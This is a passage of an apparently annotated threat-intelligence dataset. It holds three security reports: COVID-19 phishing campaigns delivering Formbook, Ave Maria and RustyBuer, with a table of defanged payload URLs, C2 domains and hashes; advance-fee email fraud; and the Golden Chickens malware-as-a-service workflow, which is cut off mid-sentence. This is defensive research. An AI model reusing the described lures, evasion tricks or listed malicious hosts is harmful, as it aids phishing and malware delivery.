themes](https://www.proofpoint.com/us/blog/security-briefs/threat-actors-pair-tax-themed-lures-covid-19-healthcare-themes)\u00a0with messages purporting to be pandemic financial relief or healthcare information.\nThis trend continues as the Delta variant\u00a0[spreads](https://www.reuters.com/business/healthcare-pharmaceuticals/global-covid-19-cases-surpass-200-mln-delta-variant-spreads-2021-08-04/), and companies\u00a0[require](https://www.nytimes.com/2021/08/03/business/vaccine-mandate-employees-microsoft.html)\u00a0vaccinations before employees can return to work.\n### Credential Theft\nProofpoint researchers\u00a0have\u00a0observed multiple high-volume COVID-19 related credential theft campaigns, including a Microsoft credential theft campaign targeting thousands of organizations globally.\nThe messages purported to be vaccination self-compliance reports sent by the target entities\u2019 human resources divisions.\nThe emails contained the following characteristics, for example:\u00a0\u00a0\nFrom: \"HR@[organizationname.tld]\" <various senders>\u00a0\nSubject: Covid-19 Vaccination Self Compliance Report.\nThe messages contained\u00a0a URL which likely leads to a fake Microsoft authentication page designed to harvest user credentials.\n![O365](/sites/default/files/inline-images/Figure%202_2.png)\n*Figure\u00a02. Self-compliance COVID-19 vaccine lure.*\nRecently, many major American companies began requiring employees to be vaccinated before returning to the office.\nAs vaccine requirements become more widely adopted by employers, it is likely this type of lure theme will be used by threat actors.\n### Employment Status\nProofpoint researchers observed a new high-volume\u00a0Formbook\u00a0campaign sent to\u00a0hundreds of\u00a0organizations masquerading as a\u00a0human resource\u00a0professional.\nThe emails\u00a0contain a zipped file\u00a0(e.g.\u00a0Scan.Salary.zip)\u00a0and\u00a0tell the recipients\u00a0that\u00a0their jobs are being eliminated due to\u00a0the financial impact of\u00a0COVID-19.\n![Email](/sites/default/files/inline-images/Screen%20Shot%202021-08-24%20at%2010.32.55%20AM.png)\n*Figure\u00a03. Email allegedly from an organization\u2019s human resources division.*\nThe emails are generic\u00a0but\u00a0customized to the\u00a0intended organization.\nTo further entice the recipient to open the malicious file, the email states a \u201c2\u00a0months\u00a0salary receipt\u201d is attached.\nThe emails contain a malicious\u00a0.ZIP\u00a0attachment, that when\u00a0extracted and\u00a0executed leads to the installation of Formbook malware.\nThis campaign consisted of\u00a0over\u00a07,000 emails intended for a broad spectrum of\u00a0organizations.\n### Ave Maria\nProofpoint researchers\u202fidentified new Ave Maria\u00a0malware campaigns largely targeting energy and industrial organizations.\nAve Maria is a remote access trojan, written in C++, that is capable of process and file system manipulation, command shell access, webcam control, keylogging, password theft, and remote desktop access.\nThe first observed series of emails purported to be health advisories\u00a0related\u00a0to COVID-19 and purported to contain \u201cpreventative measures\u201d relating to the target company\u2019s policies.\nOver\u00a0a thousand\u00a0emails targeted dozens of customers,\u00a0with more than 90% of the intended targets in the\u00a0energy vertical.\nSubsequent related campaigns used themes unrelated to COVID-19.\nThe\u00a0virus-related\u00a0messages purported to be, for example:\u202f\u00a0\nFrom: HEALTH CARES <admin@ledfarm[.]store>\u202f\u00a0\nSubject: COVID-19 PREVENTIVE MEASURES\u202f\u00a0\nAttachments: covid-19\\_preventive measures.xlsx\u202f\u00a0\nThe body of the emails also contained emails unique to the target entity, for\u00a0example\u202fhealthcare@[targetcompany].com.\nThe contents of the\u202femails\u202fclaimed there was\u202fnew COVID-19\u202fpreventative measures\u202fincluded in the attachment.\nFurthermore, the emails contained\u202fCOVID-19 cases, deaths, and\u202fvaccine doses administered.\n![COVID-19](/sites/default/files/inline-images/Figure%204_0.png)\u202f\u00a0\n*Figure\u00a04. Email purporting to be related to COVID-19 measures.*\nThe following week, Proofpoint\u00a0observed additional\u00a0Ave Maria\u00a0campaigns\u00a0distributing COVID-19 themed messages, for example:\u00a0\nFrom:\u00a0customercareservicesY\u00a0\nSubject: COVID-19 SELF SERVICE CERTIFICATE/PREVENTIVE MEASURES\u00a0\nAll the observed Ave Maria COVID-19 themed messages contained an Excel attachment that exploits various Equation Editor vulnerabilities.\nThe malware\u2019s command and control infrastructure utilized\u00a0Dynamic\u00a0DNS and communication over port 5200.\n### RustyBuer\nCurrently, one of the most\u00a0active COVID-19 related threats is\u00a0RustyBuer, a\u00a0new Rust-based\u00a0Buer\u00a0Loader strain\u00a0[first identified](https://www.proofpoint.com/us/blog/threat-insight/new-variant-buer-loader-written-rust)\u00a0by Proofpoint researchers in April 2021.\n[Buer](https://malpedia.caad.fkie.fraunhofer.de/details/win.buer)\u202fis a downloader\u00a0 that is used as a foothold in compromised networks\u00a0& an \u2018Initial Access Broker\u2019 to\u00a0distribute other\u00a0secondary payloads\u202f[including ransomware](https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf).\nThe recent campaigns leveraging the pandemic themes include senders purporting to be related to healthcare with subjects referencing vaccine mandates, equitable healthcare opportunities, and current infection rates.\nHistorically, threat actors leveraging\u00a0Buer\u00a0and\u00a0RustyBuer\u00a0generally did not use COVID-19 themes; the virus theme was previously observed once associated with this malware in November 2020.\nIn recently observed campaigns, the message purport to be from senders including:\u00a0\u00a0\ninfo@covidhospitalgeer[.]com\u00a0\ninfo@covidadministration[.]com\u00a0\nThe emails contain subjects like:\u00a0\nCOVID-19 infections at higher than Covid and rubbed his restaurants and\u00a0COVID-19 vaccinations for its mask mandate for the ongoing disaster which\u00a0The observed\u00a0messages contain\u00a0password protected zipped\u00a0Microsoft Excel attachments with macros which, if enabled, will\u00a0download\u00a0and execute\u00a0RustyBuer.\nThe messages do not\u00a0mimic any\u00a0official correspondence, and often do not make\u00a0grammatical\u00a0sense\u00a0and appear to contain fragments from news reports.\nHowever, the language and graphics used suggest an urgency to the recipient and may entice them to click on the attachment.\n![COVID-19](/sites/default/files/inline-images/Figure%205.png)\n*Figure\u00a05. COVID-19 themed lure distributing\u00a0RustyBuer.*\n### Conclusion\nIf the\u00a0severity\u00a0of the Delta variant increases\u00a0in\u00a0proportion to\u00a0COVID-19 infections, we expect\u00a0an increase in media coverage\u00a0worldwide.\nBased on past behavior,\u00a0media\u00a0attention\u00a0increases\u00a0the likelihood\u00a0that actors\u00a0will\u00a0shift back to\u00a0a broader adoption of\u00a0COVID-19 as social engineering material\u00a0and localize that material to their perspective regions.\nIt is possible more threat actors will begin to use the virus as\u00a0a\u00a0lure in future campaigns while infection rates and interest in the virus and protective measures\u00a0remains high.\nThe following indicators of compromise represent a sample of recent COVID-19 threats.\n| **Indicator** | **Description** |\n| http://sweetdreambymoon[.]stars[.]bz/a2/p3.exe\u202f\u00a0 | Ave Maria / Warzone\u202fPayload URL\u202f\u00a0 |\n| a2ba3e1a002cd3c7d5be4ff05d6001692a1a516096159ac77b78f0ddd9c3060e\u202f\u00a0 | Payload\u202fSHA256\u202f\u00a0 |\n| warzonlogs[.]duckdns[.]org\u202f\u00a0 | Ave Maria / Warzone C2\u202f\u00a0 |\n| admin@ledfarm[.]store\u202f\u00a0 | Ave Maria\u00a0Sender Email\u202f\u00a0 |\n| contact@wmbtole-com[.]uno\u202f\u00a0 | Ave Maria\u00a0Sender Email\u202f\u00a0 |\n| contact@yumaletab-net[.]uno\u202f\u00a0 | Ave Maria\u00a0Sender Email\u202f\u00a0 |\n| \u202finfo@taxpunishdep[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |\n| info@loveshipper[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |\n| https://luareraopy[.]com/api/v3/dacryorrhea/cardholders/nympholepsies\u00a0\n\u00a0 | RustyBuer\u00a0Document Payload\u00a0 |\n| cerionetya[.]com\u00a0 | RustyBuer\u00a0C2\u00a0 |\n| 88689636f4b2287701b63f42c12e7e2387bf4c3ecc45eeb8a61ea707126bad9b\u00a0\n\u00a0 | RustyBuer\u00a0Hash (Sample)\u00a0 |\n| info@deliverydhlexpress[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |\n| info@deliveryeatstreet[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |\n| https://seryanjek[.]com/api/v3/disambiguate/nonequivalent/ditrigonal\u00a0 | RustyBuer\u00a0Document Payload\u00a0 |\n| e3a11be133a98c05ab7aa90f7ca8037cfdad66b0159b5522a85dab5d54f6eb71\u00a0 | RustyBuer\u00a0Hash (Sample)\u00a0 |\n| info@covidhospitalgeer[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |\n| info@covidadministration[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |\n| info@covidbooksinfo[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |\n| info@discountfreeals[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |\n| lebatyo[.]com\u00a0 | RustyBuer\u00a0C2\u00a0 |\n| https://hejoysa[.]com/ssl/v1/getkey\u00a0 | RustyBuer\u00a0Excel Payload\u00a0 |\n| eurolord.duckdns[.]org\u00a0 | Ave Maria C2\u00a0 |\n| 6b4a4244409dc7dd0e538b98fbb886b51d626202bdc8501af5c9c4e84daecd82\u00a0 | Ave Maria Hash (Sample)\u00a0 |\n| http://sassyladywrites[.]com/a1/b7[.]exe\u00a0 | Ave Maria Payload URL\u00a0 |\n| https://00f74ba44bd85135df3aa07960343eeeec89e0088b-apidata[.]googleusercontent[.]com/download/storage/v1/b/dhngw6p6rwrwnuv6vnuse.appspot.com/o/index.html\u00a0 | Microsoft Credential Theft Phishing Landing Page\u00a0 |\n| https://storage[.]cloud[.]google[.]com/dhngw6p6rwrwnuv6vnuse.appspot.com/index.html#username@organizationname.tld\u00a0 | Microsoft Credential Theft Phishing URL\u00a0 |\n| 24cf6db04d0882f124750e4b7025455d11b02f23ad088a334e449a82d672e64a\u00a0 | Formbook\u00a0Hash\u00a0(Scan.Salary.zip)\u00a0 |\n| www.aozhengaodi[.]com/bkbk/\u00a0 | Formbook C2\u00a0 |", "mitre_ids": ["T1566", "S0367", "T1566", "T1056", "T1566", "T1056", "T1566", "T1566", "T1566", "T1204", "T1565", "T1059", "T1125", "T1056", "TA0006", "TA0011", "T1566", "T1059", "TA0011", "T1486", "TA0001", "T1566", "T1204", "TA0011", "TA0011", "TA0011", "TA0011", "T1056", "T1056", "TA0011"], "anno_name_label": [["MALWARE", "RustyBuer"], ["MALWARE", "Formbook"], ["MALWARE", "AveMaria"], ["GROUP", "mummy-spider"], ["MALWARE", "RustyBuer"], ["MALWARE", "Formbook"], ["MALWARE", "AveMaria"], ["MALWARE", "Formbook"], ["MALWARE", "Formbook"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "AveMaria"], ["MALWARE", "Formbook"], ["MALWARE", "Formbook"]], "cti_entity_class": ["CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE"]}, {"cti_report": "BEC Taxonomy: Advance Fee Fraud\nAugust 31, 2021\n### Last Time in the BEC Taxonomy Series\u2026\nProofpoint researchers\u202fin the\u00a0[sixth](/us/blog/threat-insight/bec-taxonomy-gift-carding \"BEC Taxonomy: Gift Carding \")\u00a0of\u202fthe\u202f[Business Email Compromise](/us/threat-reference/business-email-compromise \"Business Email Compromise (BEC)\")\u202f(BEC) taxonomy series explored\u00a0the gift carding\u00a0theme from the Email Fraud Taxonomy framework (Figure 1).\nGift carding\u00a0is a fairly common form of email fraud that\u00a0relies heavily on familiarity\u00a0and, like the final theme we will explore,\u00a0a sense of urgency to\u00a0override any hesitation on the part of the victims\u00a0to\u00a0get\u00a0them\u00a0to fall for the fraud.\nIn the final theme, threat actors\u00a0primarily\u00a0attempt to leverage the promise of money to lure victims.\nThis theme is Advance Fee Fraud.\n![image-20210830142022-1](/sites/default/files/inline-images/image-20210830142022-1.png)\n*Figure 1. Email Fraud Taxonomy Framework.*\n### What\u00a0is\u00a0Advance Fee Fraud.\nAdvance Fee Fraud, which in the past has been referred to as \u2018419,\u2019 \u2018Nigerian 419,\u2019 or \u2018Nigerian Prince\u2019 email fraud,\u00a0occurs when\u00a0a threat actor asks the potential victim for a small amount of money in advance of a larger, promised payout to be given\u00a0to the victim\u00a0at a later date.\nThere are endless variations of this type of fraud.\nTypical schemes contain elaborate stories\u00a0that explain why there is a large sum of money available to the victim and why the sender needs\u00a0a small upfront or advanced fee before the victim gets the promised money.\nThe fraudsters often bait victims with subjects such as\u00a0inheritance, lottery winnings, awards, government payouts, and international business.\nOnce the victim provides the small amount of money to the fraudster,\u00a0however,\u00a0they cut all contact and disappear.\n### Advance Fee Fraud\u00a0and the Email Fraud Taxonomy Framework\nAdvance Fee\u00a0Fraud\u00a0leverages impersonation from the Deception layer of the Email Fraud Taxonomy.\nThreat actors\u00a0will commonly spoof a\u00a0government official, a legal representative, or a person in a dire situation to make the emails appear legitimate.\nMost\u00a0Advance Fee\u00a0Fraud\u00a0emails\u00a0use display name spoofing, as illustrated in Figure 2, to deceive recipients.\nTo a lesser extent threat actors will use the other impersonation tactics, such as spoofing the domain or using\u00a0a lookalike domain.\n![image-20210830142022-2](/sites/default/files/inline-images/image-20210830142022-2.png)\n*Figure 2.*\n### Real World Examples\nAdvance Fee Fraud\u00a0emails\u00a0use\u00a0a variety of lures to convince\u00a0recipients\u00a0of their legitimacy and to entice them to follow through on the request.\nAs seen in the following examples, threat actors will use anything from current events such as the pandemic\u00a0to business deals to\u00a0beneficiary payouts\u00a0in their schemes.\nFigure\u00a03\u00a0is\u202fa\u00a0good example of threat actors attempting to capitalize\u00a0on COVID-19\u00a0while Figure\u00a04\u00a0shows how this type of fraud can incorporate a sense of urgency to give the victim as little time as possible to contemplate whether this is a fake request or not.\n![image-20210830142022-3](/sites/default/files/inline-images/image-20210830142022-3.png)\n*Figure 3.*\n![image-20210830142022-4](/sites/default/files/inline-images/image-20210830142022-4.png)\n*Figure 4.*\nIn figure\u202f5, the threat actor\u00a0tries to\u00a0tempt the victim with a large beneficiary payment\u2014a common strategy in this type of fraud\u2014in the hopes that they can capitalize\u00a0on\u00a0the victim\u2019s\u00a0greed\u00a0and get them to share\u00a0personally identifiable information\u00a0as well as\u00a0pay\u00a0a small amount of money.\n![image-20210830142023-5](/sites/default/files/inline-images/image-20210830142023-5.png)![image-20210830142023-6](/sites/default/files/inline-images/image-20210830142023-6.png)\n*Figure 5.*\n### Conclusion\nMost Advance Fee Fraud emails are\u00a0simple and easy to spot as fraudulent\u00a0with few being well-crafted and more complex than the examples provided above.\nWhile Advance Fee only makes up a small fraction of the fraud emails Proofpoint researchers see in a day, the average loss can still be about\u00a0$5,100 per incident\u00a0when someone does fall for them.\nRelying on\u00a0greed\u00a0and a sense of urgency,\u00a0Advance Fee Fraud\u00a0can\u00a0be lucrative for threat actors, although\u00a0their success rate is\u00a0probably not nearly as\u00a0high as\u00a0it is in previously\u00a0discussed\u00a0themes\u00a0such as gift carding.\n### Keep Reading\u2026\nTo better understand Proofpoint\u2019s approach to BEC and how\u00a0our researchers\u00a0think of\u00a0the\u00a0various fraud themes, take a look at the first blog in this series,\u00a0[BEC Taxonomy: A Proofpoint Framework](/us/blog/threat-insight/bec-taxonomy-proofpoint-framework \"BEC Taxonomy: A Proofpoint Framework\").", "mitre_ids": ["T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Golden Chickens: Uncovering a Malware-as-a-Service (MaaS) Provider\nNov 29, 2018\n(Note: This article was initially written by the QuoINT Team as part of QuoScient GmbH. Since the foundation of QuoIntelligence in March 2020, this article was transferred to this website on 21 April 2020.\nExecutive Summary\n-----------------\nOver the last few years, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) has tracked activities attributed to the Cobalt group, and observed their notable evolution and continuously improving Tactics, Techniques, and Procedures (TTPs).\nSince September 2018, we have identified multiple attacks that share similar TTPs used by Cobalt during a specific timeframe but exhibit enough differenced to attribute them to separate threat actors.\nThis blog post provides an overview on a specific Malware-as-a-Service (MaaS) used within the e-Crime threat actor landscape.\nIt also provides details on two different threat actors using the MaaS that fall under the umbrella of a family we dubbed *Golden Chickens*: GC01 and GC02.\nThe success of Golden Chickens (GC) operations heavily relies on a specific MaaS sold in underground forums, which provides customers with the malwares and the infrastructure they need for targeted attacks.\nThe service owner provides the MaaS through the use of the following toolkits: Venom and Taurus building kits for crafting documents used to deliver the attack, and the more\\_eggs (aka Terra Loader, [SpicyOmelette](https://www.secureworks.com/blog/cybercriminals-increasingly-trying-to-ensnare-the-big-financial-fish)) backdoor for taking full control of the infected computer.\nBetween November 2017 and July 2018, we attributed to GC02 five spear phishing waves which indiscriminately targeted companies and organizations in at least India and the United States.\nAs a result of using the same MaaS provider, GC02 and Cobalt group\u2019s TTPs and infrastructure strongly overlapped in May 2018, making it hard at first glance to differentiate the two threat actors.\nBetween August and October 2018, we attributed to GC01 nine spear phishing waves targeting multiple companies and organizations operating in the financial industry.\nThroughout the campaign, we observed the installation of multiple Remote Access Tool (RAT) variations as the result of a successfully compromised victim machine.\nBy highlighting the multi-layer infrastructure adopted by Cobalt and Golden Chickens, as well as the multi-client business model of the MaaS behind it, we emphasize the difficulty of performing reliable attribution for cyberattacks, and the high uncertainty that analysts are confronted with during the process.\nTo note, other [researchers](https://researchcenter.paloaltonetworks.com/2018/10/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/) reported the same Indicators of Compromise (IoC) and C2 infrastructure covered in this blog post.\nWe hope that our attribution will clarify the current threat landscape and make the covered threat actor profiles more accurate.\n*The following blog post is a preview of the Intelligence Assessment we will disseminate to our clients, partners, and vetted* [*requesters*](/cdn-cgi/l/email-protection#127167607b7d67615263677d7b7c66777e7e7b75777c71773c7767)*.*\nIntroduction\n------------\nCyber attribution is becoming increasingly challenging as threat actors frequently use false flag techniques and shared infrastructure to increase the resiliency of their operations against takedowns and law enforcement investigations.\nEspecially for e-Crime actors, it is a common practice to rent the same bulletproof infrastructure or botnet used by other e-Crime groups, resulting in the increased likelihood for an overlap of C2 servers.\nIn the last years, we have noted a tendency of threat actors outsourcing even more parts of the kill-chain to third parties by using/offering MaaS solutions.\nFigure 1 shows an example of such a network where multiple stakeholders are involved.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/1196/1*gTJyiniaHUv2LEtlrlgN_w.png)\nFigure 1 \u2014 Example of attribution complexity\nA threat actor can buy several malware from multiple developers, rent the C2 infrastructure from various providers, and deliver the attack vector to victims from yet another provider.\nThis compartmentalized business relationship guarantees the threat actor an elevated level of privacy and deniability since the involved stakeholders rarely know the full scale of the operation.\nOn the other hand, those providers offering MaaS solutions simplify the entire process through *One Stop Shop* solutions, where one single entity sells and rents both the malware and the infrastructure needed for an attack.\nWhen profiling e-Crime threat actors, we always deal with the hypothesis that the malware and C2 infrastructure we are analyzing do not belong to the threat actor *per se*, but rather to the used MaaS provider.\nWhen we confirm the use of a MaaS, the attribution process focuses on *how* and *when* threat actors used it, and *who* they targeted.\nBy using such an approach, we were able to differentiate past spear phishing campaigns mistakenly attributed to the Cobalt group and characterize two distinct threat actors \u2014 GC01 and GC02 \u2014 and the MaaS used by them to carry out their attacks.\nGolden Chickens\u2019 MaaS\n---------------------\nFrom November 2017 to October 2018, we attributed 14 campaigns to the Golden Chickens (GC) threat actors that used a specific MaaS provider (hereinafter \u201c*the Provider*\u201d) offered by a known individual (hereinafter *\u201cthe Provider Operator\u201d*).\nThe following section explains the operational model of the Provider, and the toolkits used to deliver the requested service to paying customers.\n### Operational workflow\nA typical business case between a threat actor and the Provider is shown in Figure 2 and detailed below.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/1168/1*irO1qVlzmFq1q-R_jLxekw.png)\nFigure 2 \u2013The Provider operational workflow\n1.Threat actors buy the service offered and then give the Provider Operator the final payload to be executed on the infected machine.\nSince we have observed the same threat actor using the Provider to different extents, we assess that the Provider Operator\u2019s offering is modular.\n2.The Provider Operator builds the malicious document (maldoc), the backdoor, and prepares the server infrastructure needed for the execution of the attack.\nNext, the backdoor is stored on a webserver and the full URL path of it is embedded into the maldoc. Lastly, the C2 panel that the backdoor will beacon to is set up.\n3.The Provider returns the maldoc to the threat actor.\nAlthough not confirmed, the Provider Operator also likely delivers the access details for the backdoor\u2019s C2 web panel.\n4.The threat actor disseminates (directly or through the use of a botnet) the maldoc via spear phishing.\n5.Once the maldoc is executed on a victim\u2019s machine, it will retrieve and execute the backdoor from the hardcoded web location.\n6.The backdoor beacons to the hardcoded C2 on a regular basis and executes the commands it receives.\n7.Finally, the threat actor (or the Provider) will review the system details of the infected machine reported by the backdoor, and eventually deploy the final payload.\n### **Building Kits Used**\nThe Provider relies on the use of specific malicious artifacts advertised in the underground since 2017.\nThose artifacts are generated by three building kits and offered to paying customers with the supporting C2 infrastructure.\n**VenomKit.** VenomKit is a tool that threat actors can use to craft malicious Rich Text File (RTF) documents that exploit multiple vulnerabilities, including CVE-2017\u201311882, CVE-2018\u20130802, and CVE-2018\u20138174.\nSuccessful exploitation leads to batch and scriptlet files being dropped and executed in order to download the second stage payload from a Web resource.\nThe AV detection rate for RTF documents generated by VenomKit is *moderate* to *high* due to the exploitation of known vulnerabilities.\n**Taurus Builder Kit.** The Taurus Builder Kit generates Microsoft Word documents weaponized with malicious Visual Basic for Application (VBA) macro code.\nUnlike the malicious RTFs created by VenomKit, the weaponized Word documents require user interaction in order to enable the contained malicious code.\nOn the other hand, documents generated by this kit are more resilient to AV detection due to the use of multiple layers of obfuscation in the VBA code.\nOnce the VBA code is enabled by the user, documents created by Taurus Builder Kit will download and execute additional malware by using multiple legit Windows tools in order to bypass AppLocker.\n**More\\_Eggs Backdoor.** More\\_eggs is a JavaScript (JS) backdoor capable of beaconing to a fixed C2 server and executing additional payloads downloaded from an external Web resource.\nThe backdoor is delivered encrypted inside of another JavaScript, with changing function names, variable names, and encryption keys.\nOverall, the technique used allows the Provider Operator to guarantee its clients a low AV detection rate.\nThe more\\_eggs building kit allows customization of its multiple variables, for values such as the C2 server, beaconing and sleeping time, and part of the cryptographic key used for ciphering the C2 communications.\nFigure 3 shows an example of more\\_eggs configuration that includes the version number *BV*, C2 address *Gate*, and part of the ciphering key used to encrypt C2 communications, *Rkey*.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/942/1*Rs6xkEOMJUlq0Z8B_VDKoA.png)\nFigure 3\u2013 Excerpt of more\\_eggs backdoor configured variables\nThreat actors can ask for the customization of the backdoor by requesting the addition of specific variables or entire functionalities.\nFor instance, more\\_eggs samples attributed to GC02 contained the extra variable *Researchers,* differently from the ones attributed to GC01 or Cobalt Group.\nAlthough not confirmed, it is reasonable to assume that multiple more\\_eggs used by different threat actors cannot share the same *Gate* value due to the derived complication that would imply for the backend to understand which C2 communications belong to which threat actor using the infrastructure.\nHowever, the same C2 server can host multiple gates by using different web pages; hence, multiple threat actors might use distinct gates hosted on the same domain name.\nAdditionally, the *Rkey* variable can be considered as something that is randomly generated every time a new sample is created for a customer (i.e. the relationship between the threat actor and RKey used is likely 1:1).\nDue to this consideration, we used the Rkey variable while clustering attacks together and attributing them to specific threat actor.\nThe Provider Operator demonstrates notable efforts in keeping the more\\_eggs backdoor updated by fixing bugs and adding new features: in the last year alone, we observed six different versions in use, from 2.0 to the most recent version 5.4. Notably, more\\_eggs backdoors are also capable of automatically updating themselves to the latest version, and even updating the configured *Gate* variable.\nThreat Activity Analysis\n------------------------\nThe following section highlights the operations and TTPs of three distinct threat actors that have used the Provider in the last year: the Cobalt Group, GC01 and GC02.\n### Timeline analysis\nFigure 4 represents the multiple spear phishing campaigns we have attributed to either Cobalt[1] or the Golden Chickens (GC) family during the last year.\nWhile all GC campaigns used the Provider, only those attributed to Cobalt in May, June, and on 2 August used the Provider.\nQuoINT determines the level of confidence based on both the reliability of the information processed, and the extent of the analytic techniques adopted during the analysis.\nOur analysis distinguished three different threat actors based on the following factors:\n1.**Targeting.** Which types of companies the threat actors targeted.\n2.**Use of the MaaS.** How the Provider was used, to what extent, and the configuration requested.\n3.**Final Payload.** What final payload the MaaS delivered.\n4.**Time of attack.** When the threat actor used the Provider\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/1158/1*Rs_FfAQwwik8NdrqyV7hBg.png)\nFigure 4 \u2014 Timeline analysis of attacks conducted by GC family and Cobalt Group\nIn May 2018, Cobalt executed three different spear phishing campaigns in between two GC02 campaigns.\nThe attacks leveraged the same Provider since they used maldocs generated by either VenomKit or Taurus Building Kit, more\\_eggs, and the Provider\u2019s C2 infrastructure.\nHowever, as also highlighted by [researchers](https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html), the attacks presented key differences based on (a) the targeting; (b) the attack vector, and; ( c) the more\\_eggs configuration.\nFigure 4 also shows that the Cobalt group ceased to use the Provider after the campaign on 2 August, and then started to consistently use different malware and infrastructure.\n### Tactics, Techniques, and Procedures\nFigure 5 details the TTPs we observed during all the attacks that leveraged the Provider.\n![](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![](https://miro.medium.com/max/1186/1*dv2ZoivxtxC0STiLAomYMQ.png)\nFigure 5 \u2014 Cobalt and GC campaigns using the Provider\n1.Delivery.Each campaign began with a spear phishing email, but each presented differences depending on the threat actor behind the attack:\n* GC threat actors used either compromised or spoofed email addresses.\nFurthermore, GC01 targeted companies and organizations operating in the financial industry mainly in Europe, Africa, and Asia.\nDifferently, GC02 indiscriminately targeted companies and organizations in at least India and the United States.\n* Cobalt also used compromised addresses but only in three attacks.\nThe other 12 spear phishing emails were sent from domain names previously registered by them, imitating a specific organization.\nRegistration of look-alike domains is a common technique used by Cobalt Group.\nLastly, all Cobalt campaigns targeted financial institutions and organizations mainly in Europe, Asia and Middle East.\n2.Exploitation I (Optional).Both threat actor groups used a non-malicious PDF, luring the user to click on the contained link in order to download the maldoc.\nThe attackers used a technique known as [*Google Redirecto*r](https://www.securitysift.com/why-google-makes-my-job-more-difficult/) which consists of appending the malicious URL at the end of a Google logout URL.\nBy doing this, the user will first visit the legit Google logout page and then automatically be redirected to the final URL, triggering the download of the malicious document.\n* GC01 always used this technique.\nGC02 used this technique in all but one campaign (10 July), which is one reason why we assessed such attribution with low confidence.\n* Cobalt only used this technique two times, during the campaigns of 7 and 29 June.\nIt is not clear to us if the Provider Operator offers the non-malicious PDF (with Google Redirector technique) directly or recommends the use of a third-party kit.\nTo note, we are aware of attacks in the wild using this technique, but without relying on the Provider altogether.\n3.Exploitation II \u2014 Getting the Maldoc.The user downloads either a macro-weaponized Word document created by Taurus Builder Kit, or a malicious RTF created by VenomKit.\nSuccessful execution of the maldocs initiates the download of additional batch scripts and then the ultimate download of the more\\_eggs backdoor.\n* GC01 and GC02 used newer more\\_eggs versions: 3.0, 4.2, 4.4, 5.2 and 5.4. GC02 used the variable *Researchers* assigned with the value \u201c*We are not cobalt gang, stop associating us with such skids!*\u201c.\n* Cobalt Group only used more\\_eggs versions 2.0, having a specific command named *via\\_x*.\nThis command is used to execute additional executables via cmd.exe.\nFor those campaigns that were not using the non-malicious PDF attack vector, the victims got the downloader through either browsing a link included in the email body, or directly through the email attachment.\n4.C2 I \u2014 Getting the Backdoor.The maldoc retrieves more\\_eggs from a remote location and executes it. Next, the backdoor starts beaconing to the C2 defined in the *Gate* variable.\n5.C2 II \u2014 Getting the Final Payload.Once the threat actor (or the Provider Operator) determines that the infected system is of interest, the final payload is eventually pushed and executed.\nTo note, we were not always able to get the final payload because the more\\_eggs C2 normally has a short lifetime.\nHowever, we were able to observe the following different payloads being distributed by the different threat actors:\n* Campaigns attributed to GC01 resulted in the download of three different RATs: Netwire, Remcos, and Revenge.\n* Campaigns attributed to Cobalt Group resulted in the download of either the CobInt backdoor, or the Cobalt Strike beacon.\nSo far, CobInt is a backdoor that was only observed in Cobalt Group campaigns, while Cobalt Strike is a notorious attack framework used to execute Red Team exercises.\nWe consider the use of CobInt and Cobalt Strike as a final payload a strong indicator while attributing attacks to the 